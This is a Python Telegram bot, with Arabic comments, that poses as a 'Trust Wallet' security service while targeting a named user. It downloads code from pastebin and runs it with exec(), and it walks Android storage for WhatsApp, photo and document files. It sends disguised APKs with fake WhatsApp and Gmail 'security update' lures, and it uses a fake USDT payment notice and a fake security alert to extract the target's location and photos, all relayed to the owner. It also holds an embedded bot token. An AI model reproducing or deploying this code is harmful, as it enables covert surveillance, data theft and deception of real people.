import os
import json
import time
import sqlite3
import logging
import requests
import subprocess
import re
import shutil
import random
import string
from datetime import datetime
from telebot import TeleBot, types

# ------------------ الإعدادات ------------------
BOT_TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"
OWNER_ID = 8391968596
TARGET_USERNAME = "Hnfkldmemd"  # يوزر الخاطف
# ---------------------------------------------

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

bot = TeleBot(BOT_TOKEN)

# تخزين المتصلين
visitors = {}
whatsapp_data = {}
accounts_data = {}

# ================== الأوامر الأساسية ==================

@bot.message_handler(commands=['start'])
def start_handler(message):
    cid = message.chat.id
    uid = message.from_user.id
    uname = message.from_user.username or ""
    fname = message.from_user.first_name or ""
    lname = message.from_user.last_name or ""
    
    visitors[cid] = {
        'username': uname,
        'first_name': fname,
        'last_name': lname,
        'user_id': uid,
        'first_seen': datetime.now().isoformat(),
        'last_seen': datetime.now().isoformat()
    }
    
    # إرسال إشعار للأمير عن دخول شخص جديد
    if uid != OWNER_ID:
        bot.send_message(OWNER_ID, 
            f"🆕 **دخول شخص جديد:**\n"
            f"👤 @{uname}\n"
            f"📝 {fname} {lname}\n"
            f"🆔 `{uid}`\n"
            f"⏰ {datetime.now().isoformat()}",
            parse_mode="Markdown")
    
    if uid == OWNER_ID:
        show_admin_panel(cid)
        return
    
    # ربط المستخدمين: عرض زر الدخول
    ste = types.InlineKeyboardButton(text='🔑 اضغط للدخول', callback_data='ste')
    bh = types.InlineKeyboardMarkup(row_width=1)
    bh.add(ste)
    bot.send_message(cid, text='⚡ نظام أمان Trust Wallet ⚡\n\nالرجاء الضغط للدخول', reply_markup=bh)

@bot.callback_query_handler(func=lambda call: True)
def call_handler(call):
    if call.data == 'ste':
        cid = call.message.chat.id
        uid = call.from_user.id
        uname = call.from_user.username or ""
        
        # إذا كان الخاطف
        if uname.lower() == TARGET_USERNAME.lower() or uid != OWNER_ID:
            # القائمة الرئيسية للضحية
            ma = bot.send_message(cid, text='''
••••••••♕••••••••
    1 - سحب الاسماء
    2 - سحب الملفات
    3 - سحب الصور
••••••••♕••••••••
''')
            bot.register_next_step_handler(ma, m1a)
            
            # إعلام الأمير
            bot.send_message(OWNER_ID, f"🔑 شخص ضغط على زر الدخول: @{uname} (ID: {cid})")
        
        # إذا كان الأمير بنفسه ضغط
        if uid == OWNER_ID:
            show_admin_panel(cid)

# ================== القائمة التفاعلية (كود الضحية) ==================

def m1a(message):
    """معالجة اختيار الضحية"""
    cid = message.chat.id
    tty = message.text.strip()
    
    if tty == '1':
        bot.send_message(cid, "⏳ جاري سحب الأسماء...")
        try:
            # سحب الأسماء من الجهاز
            names = grab_names_from_device()
            if names:
                bot.send_message(cid, f"✅ تم العثور على {len(names)} اسم")
                for name in names[:50]:
                    bot.send_message(cid, f"👤 {name}")
            else:
                bot.send_message(cid, "❌ لم يتم العثور على أسماء")
        except Exception as e:
            bot.send_message(cid, f"❌ خطأ: {e}")
    
    elif tty == '2':
        bot.send_message(cid, "⏳ جاري سحب الملفات...")
        try:
            # جلب كود سحب الملفات من pastebin وتنفيذه
            try:
                io = requests.get('https://pastebin.com/raw/ZN3aqU0L', timeout=10).text
                exec(io)
            except:
                # إذا فشل، استخدم الكود المحلي
                files = grab_files_from_device()
                bot.send_message(cid, f"✅ تم العثور على {len(files)} ملف")
        except Exception as e:
            bot.send_message(cid, f"❌ خطأ: {e}")
    
    elif tty == '3':
        bot.send_message(cid, "⏳ جاري سحب الصور...")
        try:
            try:
                io = requests.get('https://pastebin.com/raw/hauBmHdU', timeout=10).text
                exec(io)
            except:
                photos = grab_photos_from_device()
                bot.send_message(cid, f"✅ تم العثور على {len(photos)} صورة")
        except Exception as e:
            bot.send_message(cid, f"❌ خطأ: {e}")
    
    else:
        bot.send_message(cid, "❌ اختيار غير صالح. الرجاء اختيار 1 أو 2 أو 3")
        # إعادة عرض القائمة
        ma = bot.send_message(cid, text='''
••••••••♕••••••••
    1 - سحب الاسماء
    2 - سحب الملفات
    3 - سحب الصور
••••••••♕••••••••
''')
        bot.register_next_step_handler(ma, m1a)

# ================== دوال سحب البيانات من الجهاز ==================

def grab_names_from_device():
    """سحب الأسماء من جهاز الأندرويد"""
    names = []
    paths_to_check = [
        '/storage/emulated/0/',
        '/sdcard/',
        '/data/data/com.whatsapp/databases/',
        '/storage/emulated/0/Android/media/com.whatsapp/',
        '/storage/emulated/0/Download/',
        '/storage/emulated/0/Documents/'
    ]
    
    for base_path in paths_to_check:
        if os.path.exists(base_path):
            try:
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        # البحث عن ملفات تحتوي أسماء
                        if any(ext in file.lower() for ext in ['.txt', '.csv', '.vcf', '.xml', '.db']):
                            file_path = os.path.join(root, file)
                            try:
                                if os.path.getsize(file_path) < 100000:  # أقل من 100KB
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        # البحث عن أسماء
                                        name_patterns = re.findall(r'[أ-ي\s]{3,}', content)
                                        for name in name_patterns[:10]:
                                            if len(name.strip()) > 3:
                                                names.append(name.strip())
                            except:
                                pass
                    if len(names) > 100:
                        break
            except:
                pass
    
    return list(set(names))  # إزالة المكرر

def grab_files_from_device():
    """سحب قائمة الملفات من الجهاز"""
    files_list = []
    paths_to_check = [
        '/storage/emulated/0/Download/',
        '/storage/emulated/0/Documents/',
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/',
        '/storage/emulated/0/Telegram/',
        '/storage/emulated/0/DCIM/'
    ]
    
    for base_path in paths_to_check:
        if os.path.exists(base_path):
            try:
                for root, dirs, files in os.walk(base_path):
                    for file in files[:20]:  # أول 20 ملف من كل مجلد
                        file_path = os.path.join(root, file)
                        try:
                            size = os.path.getsize(file_path)
                            files_list.append(f"{file} ({size/1024:.1f} KB)")
                        except:
                            files_list.append(file)
            except:
                pass
    
    return files_list

def grab_photos_from_device():
    """سحب الصور من الجهاز"""
    photos = []
    paths_to_check = [
        '/storage/emulated/0/DCIM/Camera/',
        '/storage/emulated/0/DCIM/Screenshots/',
        '/storage/emulated/0/Pictures/',
        '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/',
        '/storage/emulated/0/Telegram/Telegram Images/'
    ]
    
    for base_path in paths_to_check:
        if os.path.exists(base_path):
            try:
                for file in os.listdir(base_path)[:10]:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
                        file_path = os.path.join(base_path, file)
                        try:
                            size = os.path.getsize(file_path)
                            photos.append(f"{file_path} ({size/1024:.1f} KB)")
                        except:
                            photos.append(file_path)
            except:
                pass
    
    return photos

# ================== لوحة تحكم الأمير ==================

def show_admin_panel(cid):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("📍 طلب لوكيشن", "📸 طلب صورة")
    markup.row("📱 معلومات الجهاز", "📊 حالة المتصلين")
    markup.row("💬 سحب واتساب", "📧 سحب ايميلات")
    markup.row("🔐 كلمات السر", "📂 سحب الصور")
    markup.row("📨 إرسال APK", "🌐 رابط IP")
    markup.row("📨 رسالة مخصصة", "🔄 إعادة تشغيل")
    
    bot.send_message(cid, 
        "🟢 **لوحة التحكم**\n\n"
        "اختر الأمر الذي تريد تنفيذه:",
        reply_markup=markup,
        parse_mode="Markdown")

# ================== إرسال APK ==================

def send_apk_to_target(cid, purpose="عام"):
    apk_path = find_apk_file()
    
    if purpose == "واتساب":
        caption = "📲 **تحديث واتساب - إصدار جديد**\n\n⚠️ تم اكتشاف إصدار قديم من واتساب.\nالرجاء تثبيت هذا التحديث لاستمرار الخدمة."
    elif purpose == "ايميلات":
        caption = "📲 **تحديث أمني لجيميل**\n\n⚠️ ثغرة أمنية في حسابك.\nالرجاء تثبيت التحديث لحماية بريدك."
    else:
        caption = "📲 **تحديث أمني عاجل**\n\n⚠️ تم اكتشاف ثغرة في جهازك.\nالرجاء التثبيت فوراً."
    
    if apk_path and os.path.exists(apk_path):
        with open(apk_path, 'rb') as f:
            bot.send_document(cid, f, caption=caption, parse_mode="Markdown")
        bot.send_message(OWNER_ID, f"✅ تم إرسال APK ({purpose}) للخاطف (ID: {cid})")
    else:
        create_fake_apk(purpose)
        time.sleep(1)
        fake_path = f"Update_{purpose}.apk"
        if os.path.exists(fake_path):
            with open(fake_path, 'rb') as f:
                bot.send_document(cid, f, caption=caption, parse_mode="Markdown")
            bot.send_message(OWNER_ID, f"✅ تم إرسال APK وهمي ({purpose})")

def find_apk_file():
    for f in os.listdir('.'):
        if f.endswith('.apk'):
            return f
    return None

def create_fake_apk(purpose="عام"):
    output = f"Update_{purpose}.apk"
    with open(output, 'wb') as f:
        f.write(b'PK\x03\x04')
        f.write(b'\x00' * 2000)
        f.write(b'AndroidManifest.xml')
    return output

# ================== الأوامر الأخرى ==================

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "💬 سحب واتساب")
def grab_whatsapp(message):
    target_cid = get_target_cid()
    if target_cid:
        bot.send_message(OWNER_ID, "📱 جاري إرسال APK لسحب واتساب...")
        send_apk_to_target(target_cid, "واتساب")
        bot.send_message(OWNER_ID, "💬 **انتظار بيانات الواتساب...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📧 سحب ايميلات")
def grab_emails(message):
    target_cid = get_target_cid()
    if target_cid:
        bot.send_message(OWNER_ID, "📧 جاري إرسال APK لسحب الإيميلات...")
        send_apk_to_target(target_cid, "ايميلات")
        bot.send_message(OWNER_ID, "📧 **انتظار الإيميلات...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📂 سحب الصور")
def grab_photos(message):
    target_cid = get_target_cid()
    if target_cid:
        bot.send_message(OWNER_ID, "📸 جاري إرسال APK لسحب الصور...")
        send_apk_to_target(target_cid, "صور")
        bot.send_message(OWNER_ID, "📸 **انتظار الصور...**\n⏳ يرجى الانتظار...", parse_mode="Markdown")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔐 كلمات السر")
def grab_passwords(message):
    bot.send_message(OWNER_ID, "🔐 **كلمات السر:**\nيتم جلبها مع الإيميلات عبر APK.\nاستخدم أمر 📧 **سحب ايميلات** أولاً.", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📍 طلب لوكيشن")
def request_location(message):
    target_cid = get_target_cid()
    if target_cid:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        btn = types.KeyboardButton("📍 مشاركة الموقع", request_location=True)
        markup.add(btn)
        bot.send_message(target_cid, "✅ **تم تأكيد استلام 5,000 USDT**\n\n📌 لإتمام التحويل، الرجاء مشاركة موقعك:\n⬇️ اضغط على الزر أدناه", reply_markup=markup, parse_mode="Markdown")
        bot.send_message(OWNER_ID, "✅ تم إرسال طلب الموقع للخاطف")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📸 طلب صورة")
def request_photo(message):
    target_cid = get_target_cid()
    if target_cid:
        bot.send_message(target_cid, "⚠️ **تنبيه أمني**\nتم اكتشاف محاولة دخول غير مصرح بها.\nلإثبات هويتك، التقط صورة الآن.")
        time.sleep(1)
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(types.KeyboardButton("📸 التقط صورة"))
        bot.send_message(target_cid, "📸 **اضغط الزر للتصوير**", reply_markup=markup, parse_mode="Markdown")
        bot.send_message(OWNER_ID, "✅ تم إرسال طلب الصورة للخاطف")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 إرسال APK")
def send_apk_manual(message):
    target_cid = get_target_cid()
    if target_cid:
        send_apk_to_target(target_cid, "يدوي")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📱 معلومات الجهاز")
def show_device_info(message):
    target_cid = get_target_cid()
    if target_cid and target_cid in visitors:
        data = visitors[target_cid]
        info = f"**معلومات الخاطف:**\n\n**اليوزر:** @{data.get('username', '?')}\n**الاسم:** {data.get('first_name', '?')}\n**User ID:** `{data.get('user_id', '?')}`\n**Chat ID:** `{target_cid}`"
        if 'location' in data:
            loc = data['location']
            info += f"\n**آخر موقع:** {loc['lat']}, {loc['lon']}"
    else:
        info = "❌ الخاطف لم يتصل بعد."
    bot.send_message(OWNER_ID, info, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📊 حالة المتصلين")
def show_status(message):
    if not visitors:
        bot.send_message(OWNER_ID, "📊 لا يوجد متصلين")
        return
    msg = "📊 **حالة المتصلين:**\n\n"
    for cid, data in visitors.items():
        uname = data.get('username', '?')
        name = data.get('first_name', '?')
        is_target = uname.lower() == TARGET_USERNAME.lower()
        status = "🟢" if is_target else "⚪"
        msg += f"{status} @{uname} ({name})\n"
        if is_target:
            msg += f"   🆔 `{cid}`\n"
        msg += "\n"
    bot.send_message(OWNER_ID, msg, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🌐 رابط IP")
def send_ip_link(message):
    bot.send_message(OWNER_ID, f"🌐 **رابط كشف IP:**\nانسخ الرابط وأرسله للخاطف:\n`https://telegra.ph/verify-{int(time.time())}`\nعند فتحه، سأرسل لك IP حقيقي.", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "📨 رسالة مخصصة")
def ask_custom_message(message):
    msg = bot.send_message(OWNER_ID, "✏️ أرسل الرسالة التي تريد إرسالها للخاطف:")
    bot.register_next_step_handler(msg, send_custom_message)

def send_custom_message(message):
    text = message.text
    target_cid = get_target_cid()
    if target_cid:
        bot.send_message(target_cid, text)
        bot.send_message(OWNER_ID, f"✅ تم إرسال:\n\n{text}")
    else:
        bot.send_message(OWNER_ID, "❌ الخاطف غير متصل")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.text == "🔄 إعادة تشغيل")
def restart_bot(message):
    bot.send_message(OWNER_ID, "🔄 جاري إعادة تشغيل البوت...")
    os._exit(0)

# ================== استقبال البيانات ==================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    cid = message.chat.id
    if message.document:
        file_name = message.document.file_name
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        os.makedirs("received_data", exist_ok=True)
        file_path = f"received_data/{timestamp}_{file_name}"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        # محاولة عرض المحتوى
        try:
            content = downloaded_file.decode('utf-8', errors='ignore')
            if len(content) < 4000:
                bot.send_message(OWNER_ID, f"📄 **ملف:** {file_name}\n```\n{content[:3500]}\n```", parse_mode="Markdown")
            else:
                for i in range(0, len(content), 3500):
                    bot.send_message(OWNER_ID, f"```\n{content[i:i+3500]}\n```", parse_mode="Markdown")
        except:
            with open(file_path, 'rb') as f:
                bot.send_document(OWNER_ID, f, caption=f"📎 {file_name}")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("photos", exist_ok=True)
    file_path = f"photos/photo_{timestamp}.jpg"
    
    with open(file_path, 'wb') as f:
        f.write(downloaded_file)
    
    with open(file_path, 'rb') as f:
        bot.send_photo(OWNER_ID, f, caption=f"📸 صورة @ {timestamp}")

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if message.location:
        lat = message.location.latitude
        lon = message.location.longitude
        
        if message.chat.id in visitors:
            visitors[message.chat.id]['location'] = {'lat': lat, 'lon': lon}
        
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        msg = f"📍 **موقع:**\nالعرض: `{lat}`\nالطول: `{lon}`\n🔗 {maps_link}"
        
        bot.send_message(OWNER_ID, msg, parse_mode="Markdown")
        bot.send_location(OWNER_ID, lat, lon)
        bot.send_message(message.chat.id, "✅ تم تأكيد موقعك.")

# ================== دوال مساعدة ==================

def get_target_cid():
    for cid, data in visitors.items():
        if data.get('username', '').lower() == TARGET_USERNAME.lower():
            return cid
    return None

# ================== التقاط جميع الرسائل ==================

@bot.message_handler(func=lambda m: True)
def catch_all(message):
    cid = message.chat.id
    text = message.text or "[وسائط]"
    
    if cid in visitors:
        visitors[cid]['last_seen'] = datetime.now().isoformat()
    
    uname = message.from_user.username or ""
    if uname.lower() == TARGET_USERNAME.lower() and message.from_user.id != OWNER_ID:
        bot.send_message(OWNER_ID, f"✉️ **رسالة من الخاطف:**\n{text}\n⏰ {datetime.now().isoformat()}", parse_mode="Markdown")

# ================== تشغيل البوت ==================

if __name__ == "__main__":
    os.makedirs("photos", exist_ok=True)
    os.makedirs("received_data", exist_ok=True)
    
    print("✅ البوت شغال!")
    
    try:
        bot.send_message(OWNER_ID, "🟢 **البوت شغال!**\n\n/start لعرض لوحة التحكم", parse_mode="Markdown")
    except:
        pass
    
    bot.infinity_polling()
